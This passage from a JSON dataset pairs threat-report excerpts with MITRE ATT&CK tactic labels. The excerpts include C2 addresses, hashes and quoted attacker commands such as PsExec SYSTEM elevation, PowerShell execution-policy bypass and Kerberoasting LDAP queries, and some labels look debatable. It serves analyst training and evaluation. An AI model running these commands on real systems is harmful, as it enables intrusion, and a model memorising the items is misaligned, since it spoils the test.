thePowerSploitframework'sInvoke-Kerberoastutility is being used.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Following the user mounting the .iso file, they clicked on a .lnk filedocuments.lnk. As noted in previousreports, the .dll is hidden from the user unless they display hidden items in explorer like so:\nThe .lnk contains instructions to execute a specific exported function with the BumbleBee DLL file.\nWhen the .lnk was doubled clicked by the user, the BumbleBee malwaretamirlan.dllwas executed:\nThe output ofLECmd.exe, when used ondocuments.lnk, provided additional context to where and when this .lnk file was created:\nApproximately 5 seconds after execution, therundll32.exeprocess contacted the IP154.56.0.221. More information on this traffic is covered in the Command and Control section below.\nAn interesting tactic of note, was the use of WMI and COM function calls to start the process, used to inject into. The BumbleBee loader uses WMI to start new process by calling COM functions to create a new process. Below you can see the COM instance creation followed by defining the WMI namespace and WMI object being created  \"Win32_Process\".\nAnalysis of the loader found that a function of the malware chooses 1 of 3 target processes before injecting the supplied code:\nThis resulted in new processes not being a child of BumbleBee, but rather WmiPrvSE.exe.\nIn this intrusion, an instance ofC:\\Program Files\\Windows Photo Viewer\\ImagingDevices.exewas created and accessed by the BumbleBeerundll32.exeprocess. Shortly after this interaction, the process started communicating to a Meterpreter C23.85.198.66. This process spawnedcmd.exeand several typical discovery commands that are covered in more detail below.\nThe second process, was spawned the WMI technique was an instance ofC:\\Program Files\\Windows Mail\\wabmig.exe. This process was used to host both a session to another Meterpreter C250.16.62.87and a Cobalt Strike C2 server45.153.243.142,which was then used to conduct the majority of additional activity including credential dumping and discovery exercises highlighted below. The pivot to using Cobalt Strike began around 6 hours after the execution of the BumbleBee loader.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Over the course of the intrusion the threat actor relied on Sliver and Cobalt Strike. Sliver was used most heavily during the first day of the intrusion with Cobalt Strike then being used over the full length of the intrusion.\nwo14.py Cobalt Strike configuration.\nwo12.py Cobalt Strike configuration.\nThe two Cobalt Strike C2 showed the classic HTTP response related to the post-exploitation framework:\nBy diving deeper into the two command and control servers, it was noticed that both of them exposed the HTTP service on port 81 with the following HTTP response.\nTherefore, the following FOFA query was built to identify further potential C2 servers matching this pattern.\nSome of the first results provided by FOFA via the above-mentioned query were reported byRapid7in one of their latest blog posts.\nBased on FOFA results, all the identified command and control servers were in Bulgaria and the Netherlands.\nFurthermore, we noticed that four IP addresses (91.92.250.158, 91.92.251.240, 94.156.67.175, 94.156.67.180) had an untrusted certificate on port 441 with protocol HTTPS associated with Alibaba, when they were active Cobalt Strike servers.\nThe certificate serial number (1657766544761773100) was used to identify other possibly used by the same threat actors, and further servers were detected which showed a behavior similar to what was previously described. For example, the IP address 185.73.124.238 shares the same certificate and is, at the time of report writing, an active Cobalt Strike C2 server.\nAs described in aHunt.io blog post, these specific certificate attributes like CommonName and Organization are associated with the usage ofRedGuardwhich is a C2 redirector.\nBoth the Sliver servers 194.49.94[.]18 and 194.169.175[.]134 had invalid certificates on port 8443.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: IcedID:\ncikawemoret34.space206.189.10.247:80\nnomovee.website161.35.109.168:443JA3: a0e9f5d64349fb13191bc781f81f42e1JA3s: ec74a5c51106f0419184d0dd08fb05bc\nCobalt Strike:\n45.86.163.78:443cloudmetric.onlineJA3:a0e9f5d64349fb13191bc781f81f42e1JA3s: ae4edc6faf64d08308082ad26be60767\nCobalt Config:\n195.189.99.74smalleststores.comJA3: 72a589da586844d7f0818ce684948eeaJA3s: ae4edc6faf64d08308082ad26be60767\nCobalt Config:",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Bypass User Account Account (T1088) \nWhile attackers control targeting of victims in many cases, they don't always wind up with an elevated user during initial compromise. Even when a spearphishing victim is a local administrator, the attacker will oftentimes need to escalate from a Medium to High integrity process before continuing. Off-the-shelf offensive tools like Koadic can enable that transition with relative ease, including several different UAC Bypass modules out of the box. \nFor this example, we'll examine a well-known UAC Bypass technique published by Matt Nelson (@enigma0x3) while leveraging the Computer Management launcher - CompMgmtLauncher.exe - which is interoperable with the Microsoft Management Console (MMC). Details about this technique, which still works on Windows 7 endpoints, can be found here. \nThis technique involves modifying the Windows Registry to change the default association of files the MMC interacts with   \n(HKCU\\Software\\Classes\\mscfile\\shell\\open\\command) to an application of the attacker's choice. By deploying a malicious script object with a compatible extension and altering this registry key value to launch a built-in script interpreter, an adversary is able to circumvent controls. \nRight after this registry modification, look for the new process creation event tied to the auto-elevated Microsoft program (CompMgmtLauncher.exe), followed by common Koadic stager descendant processes such as Mshta.exe or Rundll32.exe - processes that should be running in a high integrity context. We can combine those events into an ordered sequence and constrain the total run-time for all the steps to complete within 10 seconds. ",
        "output": "privilege escalation",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To prepare for code injection, the Trickbot executable allocated memory in the address space of the Windows system process \"wermgr.exe\" (Windows Error Reporting Module).\nThe injected wermgr.exe process then called svchost.exe (without any command line arguments), which in turn was used to run various reconnaissance commands. More about that in the \"Discovery\" section below.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Within four hours of the completed exfiltration, merely 29 hours after initial execution, the threat actors started deploying MBR Killer (aka KillDisk), well-known for itsusage during the 2016 Banco de Chile attack. As documented by Flashpoint, the wiper is an NSIS (Nullsoft Scriptable Install System) script capable of wiping a device's MBR (Master Boot Record), MFT (Master File Table), VBR (Volume Boot Record) and EBR (Extended Boot Record) before forcing a reboot to render a device inoperable. During this destructive stage, the threat actors named the file C:\\ProgramData\\chrome.exe on the beachhead, while on other servers the C:\\Windows\\Temp\\[0-9a-f]{32}.exe naming pattern was used.\nAs a defense-evasion technique, MBR Killer has been observed using patched NSIS installers relying on non-standard headers. Once the payload signature is corrected, NSIS decompilers such as7zip (9.34  15.05)are able to extract the malicious NSIS script.\nThis customization provides defenders with a detection opportunity as outlined within the hereafter-provided YARA rules.\nDuring initialization, MBR Killer visually hides itself by moving off-screen.\nOnce hidden, the malicious installer verifies whether it is being emulated by temporarily patching the native Windows ZwClose function (part of ntdll.dll) to immediately succeed with STATUS_SUCCESS before closing a dummy handle through kernel32::CloseHandle(0x12345678) and validating that, although the handle was invalid, the CloseHandle method succeeded.\nIf the anti-analysis check succeeds, the script issues the HideWindow NSIS call, whichhides the installerand proceeds to validate the existence of the first physical drive \\\\.\\PHYSICALDRIVE0 by opening it.\nOnce the first \\\\.\\PHYSICALDRIVE0 drive opened, MBR Killer conditionally attempts to wipe:\nMFT (Master File Table) contains metadata about files and directories, such as names, dates and sizes. \nVBR (Volume Boot Record) contains, amongst others, code required to bootstrap the operating system. \nEBR (Extended Boot Record) contains information to describe logical partitions.\nMBR Killer then proceeds to wipe the MBR (Master Boot Record) three times by writing 512 empty bytes at offset 0 and attempts to repeat the wiping on the next available disk (\\\\.\\PHYSICALDRIVE1, \\\\.\\PHYSICALDRIVE2, ...).\nOnce the MBR Killer wiper has done its damage, the script attempts to modify its process privileges to enable the SeShutdownPrivilege and initiates a reboot.\nTo initiate the reboot, MBR Killer calls ExitWindowsEx with:\nEWX_REBOOT (0x2) to cause a reboot \nEWX_FORCE (0x4) to try to force the operation \nSHTDN_REASON_MAJOR_SOFTWARE (0x00030000) to indicate it was software-caused \nSHTDN_REASON_MINOR_UPGRADE (0x00000003) to indicate the software reason is an upgrade.\nWorth noting is that even-though the MBR Killer script attempts a reboot, the same functionality is implemented within the NSIS installer itself. Upon reboot, the affected machines were rendered inoperable.\nWhile the wiper we observed was not packed using VM-Protect, the decompiled script is near-similar to the2016 Banco de Chile wiper componentand indicates the source-code was likely shared.\nSupporting this theory was the change in NSIS version from v3.0b2 (Released on August 4th, 2015) to v3.04 (Released on December 15th, 2018) alongside the removal of the MBR Killer branding.\nWhile the 2016 sample wasbzip2-compressed, the recompiled version now uses the more performantzlibcompression.\nFunctionality-wise, our newly observed wiper performs a justified reboot (0x2, EWX_REBOOT) whereas the Banco de Chile variant merely performed an unjustified shut-down (0x8, EWX_POWEROFF).\nAs a hunting opportunity, we observed NSIS executables (legitimate or not) automatically drop the %Temp%\\ns[a-zA-Z0-9]{5}.tmp\\System.dll library as part of thelegitimate NSIS System plugin, giving developers the ability to call any exported function from any DLL. While not indicative of malicious activity, we recommend threat hunters review the creation of the above library to identify potentially undesirable installers within their environment.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After exploiting the business automation platform server, attackers downloaded and installed the PhantomJitter backdoor. In the incidents we observed, the backdoor was downloaded into the victims' infrastructure from the following URLs: \n1 http[:]//45.87.246[.]34:443/calc.exe   \n2 http[:]//185.158.248[.]107:443/calc.exe \nThe file was saved in the local directory as c.exe. Upon launch, it connected to the C2 server, allowing the operator to execute commands on the compromised host. \nIn addition to PhantomJitter, the attackers used CobInt, whose payload connected to the following C2 server: \nThe domain resolves to the IP address 45.156.27[.]115. ",
        "output": "command and control",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Anyone interested in learning more should explore the provided links to the MSDN documentation and Microsoft's sample driver GitHub repository for more in-depth information. The I/O section of the MSDN driver documentation is worth exploring and contains most of the entries that have been linked to in this blog post and can be found here. \nIn the next entry in this series, we will discuss installing, running and debugging drivers and the security concepts surrounding them. This will include a description of the basic setup and tooling required for analysis and knowing what to look for while performing it. To demonstrate the use of debuggers, we will show how a driver processes IOCTLs and executes dispatch routines. ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Early observed attacks by DEV-0537 targeted cryptocurrency accounts resulting in compromise and theft of wallets and funds. As they expanded their attacks, the actors began targeting telecommunication, higher education, and government organizations in South America. More recent campaigns have expanded to include organizations globally spanning a variety of sectors. Based on observed activity, this group understands the interconnected nature of identities and trust relationships in modern technology ecosystems and targets telecommunications, technology, IT services and support companiesto leverage their access from one organization to access the partner or supplier organizations. They have also been observed targeting government entities, manufacturing, higher education, energy, retailers, and healthcare. \nMicrosoft will continue to monitor DEV-0537 activity and implement protections for our customers. The current detections and advanced detections in place across our security products are detailed in the following sections. ",
        "output": "impact",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: This actors' campaign has affected multiple organizations in the energy, nuclear, water, aviation, construction, and critical manufacturing sectors. ",
        "output": "impact",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1030: Data Transfer Size Limits Thu, 04/28/2022 - 10:21 \nPosted in Threat Intelligence-Security & Identity ",
        "output": "exfiltration",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High\nSpyware is malicious software engineered to covertly monitor and gather information from a user's computer without their awareness or consent. It can record activities like keystrokes, browsing behavior, and personal information, often transmitting this data to a third party for espionage or theft.\nFortiGuard Labs recently detected an attack exploiting the CVE-2021-40444 vulnerability in Microsoft Office. This flaw allows attackers to execute malicious code via specially crafted documents. In this instance, the exploitation led to the deployment of a spyware payload known as \"MerkSpy.\" MerkSpy is designed to clandestinely monitor user activities, capture sensitive information, and establish persistence on compromised systems.\nThis blog will dissect the stages of this complex attack, offering insights into the techniques used by cybercriminals to infiltrate systems and steal sensitive data.",
        "output": "other",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: One reason we chose to use this app as a showcase is because the impact extends beyond the user's mobile device. The application gives the option to connect to remote file shares using the FTP and SMB protocols and the user credentials are saved in clear text in the \n/data/data/com.mi.android.globalFileexplorer/files/rmt_i.properties file: \nIf a third party app was able to exploit this vulnerability and obtain code execution, an attacker could retrieve these credentials. The impact would then extend even further, since by the time that a user requests to open a remote share, the browser creates the directory \n/sdcard/Android/data/com.mi.android.globalFileexplorer/files/usbTemp/ where it saves the files that the user retrieves: \nThis means that a remote attacker would be able to read or write files to SMB shares of a local network, assuming that the device was connected to it. The same stands for FTP shares as they are handled exactly in the same way: \nIn summary, the exploitation flow is depicted in the figure below: \nIn step 1, the user opens a malicious app that may pose as a file editor, messaging app, mail client, or any app in general and request the user to save a file. By the time that the user attempts to save such a file, no matter what destination path they choose to save it, the malicious app forces the file browser app to write it under its internal /files/lib folder. Then, the malicious app can start the junk cleaner using an explicit intent (no user interaction is required) and this will lead to code execution with the browser's ID (step 2). \nIn step 3, the attacker uses the arbitrary code execution capability to retrieve the SMB and FTP credentials from the rmt_i.properties file. Subsequently, the attacker can now jump to step 5 and access the shares directly using the stolen credentials. Alternatively, after retrieving the share credentials, the mobile device can connect to a local network (step 4) and access an SMB or FTP share, allowing the attacker to access the shared files through the   \n/sdcard/Android/data/com.mi.android.globalFileexplorer/files/usbTemp/ folder (step 5). ",
        "output": "impact",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Microsoft 365 Defender built-in detection: Multiple searches for sensitive data in SharePoint sites \nThis detection looks for instances where a user searched for sensitive data on SharePoint sites that an attacker can use as internal information to leverage in later attacks if the user's account is compromised. \nInvestigate the user account performing the queries to determine if it was compromised. Determine what, if any, sensitive information was accessed to assess the impact. \nNote: Data used in this detection requires advanced audit to be enabled in Microsoft Defender 365 that includes the SearchQueryInitiatedSharePoint event type. ",
        "output": "other",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The credential stealer discovered in this campaign is compiled in Golang. It enumerates the installed browser profiles on the victim machine and copies the Login data, Login State, key4.db, browser history and bookmarks files to the victim's application profile temporary folder. The stealer then processes the data and uses SQL queries to collect the login information of victims' online accounts along with the associated account URLs. Finally, the data is written to a file \"chrgetpdsi.txt\" in the user profile temporary folder. \nThe keylogger DLL running on the victim machine is a tiny executable, which hooks to the victim machine keyboard and logs keystrokes in a file called \"conhost.txt\", the same folder where the Keylogger was downloaded. \nDiscovery \nThe attacker ran PowerShell commands that are known indicators of pre-kerberoasting reconnaissance, a method used to obtain domain admin credentials. We assess with moderate confidence that a Kerberoasting attack was used to obtain accounts with higher privileges. \n(('AD_Computers: {0}' -f ([adsiSearcher]'(ObjectClass=computer)').FindAll().c ([adsisearcher]'(&(objectCategory=user)(servicePrincipalName=\\*))').FindAll() ",
        "output": "credential access",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Initial discovery actions started around 10 minutes after the initial execution of the malware. Standard Windows utilities were used:\nThe threat actor later used the Cobalt Strike beacon to execute numerous other discovery commands:\nWe suspect the threat actor was using the execute-assembly function of the Cobalt Strike beacon as there were several instances of rundll32.exe that had dotNet code injected into them.\nThe victim organization was recording certain key ETW providers which allows us to capture the threat actor loading certain modules. The following was recorded, which highlighted the threat actor using the known enumeration toolSeatbeltandSharpShares.\nThe execution of these tools generated the files seatinfo.txt and share.txt, which the threat actor viewed on host.\nInvoking SharpShares or SeatBelt (both .NET/managed applications) within an unmanaged code-based process (e.g., RunDLL32) results in the creation of a Common Language Runtime (CLR) usage log file as a side effect.\nThe presence of this file for a process such as RunDLL32.exe indicates that a .Net compiled payload has been executed. In this case we can correlate this activity to the execute-assembly event.\nOnce the threat actor was able to access the backup server, they ran adfind.exe to gather further information on the domain:\nA network check was performed with route print followed by the creation of the following file C:\\ProgramData\\scaner.zip. Shortly after, from the unzipped contents, the threat actor executed the Soft Perfect Netscan tool:\nWithin the zip content, we observed that there were other previous saved scans from at least five other victim environments.\nThe license file accompanying netscan.exe is seen below:\nShortly after the execution of netscan.exe, we observed a sudden increase in ICMP traffic which could be identified as a ping sweep across the network. Below is a sample of network traffic that exemplifies the incremental destination IP addresses during the sweep.\nBy reviewing the compromised user's Shellbags, we were able to identify the threat actor rummaging through the file shares of the network\nLocal accounts were enumerated on the beachhead host, and was indicated by a number of Windows Event ID 4799 events being created, with the calling process being 'Rundll32.exe'. After translating the CallerProcessID from hex to decimal we can correlate and confirm it as the Cobalt Strike process.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On the beachhead system, the threat actor started exploring their options to move laterally within the target network. The logged-on user account was utilized to interact with IPC$ shares.\nFor one specific system, for which the threat actor showed interest, thecontents of the C$ share was listedwe assess, to verify if the account had access permissions to the share before copying the malware to it:\nThe threat actor also pinged one of the Active Directory domain controllers from the beachhead machine.\nA high amount of ICMP traffic, targeting various Class-A subnets ranges, was observed and used to identify other active systems within the environment.\nOn the second system, to which the adversary laterally moved (see section below), the following discovery commands were executed:",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Malware related to Daxin activity:\n81c7bb39100d358f8286da5e9aa838606c98dfcc263e9a82ed91cd438cb130d1 Backdoor.Daxin (32-bit core)\n06a0ec9a316eb89cb041b1907918e3ad3b03842ec65f004f6fa74d57955573a4 Backdoor.Daxin (64-bit core)\n0f82947b2429063734c46c34fb03b4fa31050e49c27af15283d335ea22fe0555 Backdoor.Daxin (64-bit core)\n3e7724cb963ad5872af9cfb93d01abf7cd9b07f47773360ad0501592848992f4 Backdoor.Daxin (64-bit core)\n447c3c5ac9679be0a85b3df46ec5ee924f4fbd8d53093125fd21de0bff1d2aad Backdoor.Daxin (64-bit core)\n49c827cf48efb122a9d6fd87b426482b7496ccd4a2dbca31ebbf6b2b80c98530 Backdoor.Daxin (64-bit core)\n5bc3994612624da168750455b363f2964e1861dba4f1c305df01b970ac02a7ae Backdoor.Daxin (64-bit core)\n5c1585b1a1c956c7755429544f3596515dfdf928373620c51b0606a520c6245a Backdoor.Daxin (64-bit core)\n6908ebf52eb19c6719a0b508d1e2128f198d10441551cbfb9f4031d382f5229f Backdoor.Daxin (64-bit core)\n7867ba973234b99875a9f5138a074798b8d5c65290e365e09981cceb06385c54 Backdoor.Daxin (64-bit core)\n7a08d1417ca056da3a656f0b7c9cf6cd863f9b1005996d083a0fc38d292b52e9 Backdoor.Daxin (64-bit core)\n8d9a2363b757d3f127b9c6ed8f7b8b018e652369bc070aa3500b3a978feaa6ce Backdoor.Daxin (64-bit core)\nb0eb4d999e4e0e7c2e33ff081e847c87b49940eb24a9e0794c6aa9516832c427 Backdoor.Daxin (64-bit core)\nb9dad0131c51e2645e761b74a71ebad2bf175645fa9f42a4ab0e6921b83306e3 Backdoor.Daxin (64-bit core)\ncf00e7cc04af3f7c95f2b35a6f3432bef990238e1fa6f312faf64a50d495630a Backdoor.Daxin (64-bit core)\ne7af7bcb86bd6bab1835f610671c3921441965a839673ac34444cf0ce7b2164e Backdoor.Daxin (64-bit core)\nea3d773438c04274545d26cc19a33f9f1dbbff2a518e4302addc1279f9950cef Backdoor.Daxin (64-bit core)\n08dc602721c17d58a4bc0c74f64a7920086f776965e7866f68d1676eb5e7951f Backdoor.Daxin (dropper)\n53d23faf8da5791578c2f5e236e79969289a7bba04eee2db25f9791b33209631 Backdoor.Daxin (dropper)\n7a7e8df7173387aec593e4fe2b45520ea3156c5f810d2bb1b2784efd1c922376 Backdoor.Zala (32-bit core)\n8dafe5f3d0527b66f6857559e3c81872699003e0f2ffda9202a1b5e29db2002e Backdoor.Zala (32-bit core)\n96bf3ee7c6673b69c6aa173bb44e21fa636b1c2c73f4356a7599c121284a51cc Backdoor.Trojan (32-bit core)\n9c2f3e9811f7d0c7463eaa1ee6f39c23f902f3797b80891590b43bbe0fdf0e51 Backdoor.Trojan (32-bit core)\nc0d88db11d0f529754d290ed5f4c34b4dba8c4f2e5c4148866daabeab0d25f9c Backdoor.Trojan (32-bit core)\ne6a7b0bc01a627a7d0ffb07faddb3a4dd96b6f5208ac26107bdaeb3ab1ec8217 Backdoor.Trojan (32-bit core)\nFile names attributed to Daxin activity:\n\"ipfltdrvs.sys\"\n\"ndislan.sys\"\n\"ndislan_win2008_x64.sys\"\n\"ntbios.sys\"\n\"patrol.sys\"\n\"performanceaudit.sys\"\n\"print64.sys\"\n\"printsrv64.sys\"\n\"prv64.sys\"\n\"sqlwriter.sys\"\n\"srt.sys\"\n\"srt64.sys\"\n\"syswant.sys\"\n\"usbmrti.sys\"\n\"vncwantd.sys\"\n\"wantd.sys\"\n\"win2k8.sys\"\n\"wmipd.sys\"\n\"[CSIDL_SYSTEM]\\drivers\\pagefile.sys\"\n\"[CSIDL_SYSTEM]\\spool\\drivers\\ntds.sys\"\nMalware observed during overlapping activities:\n705be833bd1880924c99ec9cf1bd0fcf9714ae0cec7fd184db051d49824cbbf4 suspected Backdoor.Daxin\nc791c007c8c97196c657ac8ba25651e7be607565ae0946742a533af697a61878 suspected Backdoor.Daxin\n514d389ce87481fe1fc6549a090acf0da013b897e282ff2ef26f783bd5355a01 Trojan.Emulov (core)\n1a5c23a7736b60c14dc50bf9e802db3fcd5b6c93682bc40141d6794ae96138d3 Trojan.Emulov (dropper)\na0ac5f7d41e9801b531f8ca333c31021c5e064f13699dbd72f3dfd429f19bb26 Trojan.Owprox (core)\naa7047a3017190c66568814eb70483bf74c1163fb4ec1c515c1de29df18e26d7 Trojan.Owprox (dropper)",
        "output": "other",
        "source": "Symentec"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ttps://securelist.com/mata-multi-platform-targeted-malware-framework/97746/\nWe assess that the MATA framework is linked to the Lazarus APT group. The MATA orchestrator uses two unique filenames, c_2910.cls and k_3872.cls, which have only previously been seen in several Manuscrypt variants, including the samples (0137f688436c468d43b3e50878ec1a1f) mentioned in the US-CERT publication. ",
        "output": "other",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: IcedID\n68.183.20[.]194:80vaclicinni[.]xyz83.97.20[.]160:443oxythuler[.]cyouexpertulthima[.]clubdictorecovery[.]cyouthulleultinn[.]club\n159.89.140[.]116:443oxythuler[.]cyouthulleultinn[.]club\nCobalt Strike192.99.178[.]145:80dimentos[.]com\nConfig:",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: While tracking Earth Estries' recent activities, we found that the group exploits the Microsoft Exchange server and installs the web shell ChinaChopper, through which Earth Estries can deploy Cobalt Strike into other Active Directory (AD) servers or individual endpoints and set up the scheduled task and system service to maintain persistence in the victim's environment.\nThe command sequence from the web shell is as follows:",
        "output": "initial access",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To escalate privileges, DarkGate will perform two different approaches depending on the used crypter: \n\u2022 If the binary does not use any kind of crypter, ID 11 (raw stub option), it will try to simply elevate privileges to SYSTEM using the Sysinternals tool PsExec as follows: \nC:\\> cmd /c c:\\temp\\PsExec.exe -accepteula -i -d -s [TARGET_BINARY] \u2022 In case any of the two available crypters are used, DarkGate will try to elevate privileges using the process hollowing technique. The binary will request the CnC the binary to be injected into notepad.exe, which we suspect it will perform the elevation and the relaunching of the application. However, we did not successfully retrieve such binary. ",
        "output": "privilege escalation",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We conclude that OneNote as an attack vector is more versatile than we initially thought. It can carry executable payloads, in addition to script-based downloaders. Also, like many other file types, attackers can use it for lateral movement.\nWhen embedding malicious payloads inside OneNote files, attackers mainly leverage JavaScript, PowerShell, Batch and VBScript. However, attackers occasionally use binary payloads such as executables or even Office 97-2003 files to achieve their objectives.\nOrganizations can consider blocking embedded payloads with dangerous extensions within OneNote files to protect their users against such attacks. More broadly, we recommend people limit their exposure by checking the embedded payload filenames and extensions in OneNote files by hovering over any buttons or images before clicking them.\nPalo Alto Networks customers are better protected from the threats discussed above through the following products:\nNext-Generation Firewallwith cloud-delivered security services includingWildFire. \nPrisma Accessdevices with cloud-delivered security services including WildFire. \nCortex XDRandXSIAMagents help protect against post-exploitation activities using the multi-layer protection approach. \nTheUnit 42 Incident Responseteam can also be engaged to help with a compromise or to provide a proactive assessment to lower your risk.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the BlackCat attack, we observed network scanning and reconnaissance using softperfect network scanner. This tool has many features beyond simple network scanning and was probably a valuable tool in understanding systems roles and network infrastructure and possible lateral movement. The following commands show this tool in use. Notice that the name of the executable has been changed to make it blend into the system's regular processes. \ncmd.exe /c c:\\programdata\\system\\svchost.exe /hide /auto:c:\\programdata\\system\\192.xml /range:192.168.0.0-192.168.255.255 c:\\programdata\\system\\svchost.exe /hide /auto:c:\\programdata\\system\\192.xml /range:192.168.0.0-192.168.255.255 cmd.exe /c c:\\programdata\\system\\svchost.exe /hide /auto:c:\\programdata\\system\\192.xml /range:192.168.0.0-192.168.255.255 \nADRecon was also used to collect information from Active Directory and its key servers. \nc:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -exec bypass .\\adrecon.ps1 \nDuring the BlackMatter attack, the attackers also searched for additional ways to maintain access. For example, the following command shows the attackers exploring an existing TeamViewer installation: \ncmd.exe /q /c teamviewer.exe --getid cmd.exe /q /c dir c:\"program files cmd.exe /q /c dir c:\"program files (x86) 1 cmd.exe /q /c dir c:\"program files (x86)\\teamviewer\\ cmd.exe /q /c c:\"program files (x86)\\teamviewer\\teamviewer.exe --getid \ncmd.exe /q /c c:\"program files (x86)\\teamviewer\\teamviewer.exe -info \nThe following commands show the attackers exploring the keepass password manager config: cmd.exe /q /c dir c:\"program files (x86)\\ ",
        "output": "discovery",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The TRITON attack tool was built with a number of features, including the ability to read and write programs, read and write individual functions and query the state of the SIS controller. However, only some of these capabilities were leveraged in the trilog.exe sample (e.g. the attacker did not leverage all of TRITON's extensive reconnaissance capabilities). \nThe TRITON malware contained the capability to communicate with Triconex SIS controllers (e.g. send specific commands such as halt or read its memory content) and remotely reprogram them with an attacker-defined payload. The TRITON sample Mandiant analyzed added an attacker-provided program to the execution table of the Triconex controller. This sample left legitimate programs in place, expecting the controller to continue operating without a fault or exception. If the controller failed, TRITON would attempt to return it to a running state. If the controller did not recover within a defined time window, this sample would overwrite the malicious program with invalid data to cover its tracks. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Prior to exfiltrating the data, operators staged them under a directory called \"Shares\" on each file server. They then inspected the documents they collected prior to exfiltrating them over to Mega storage servers using theRcloneapplication.",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
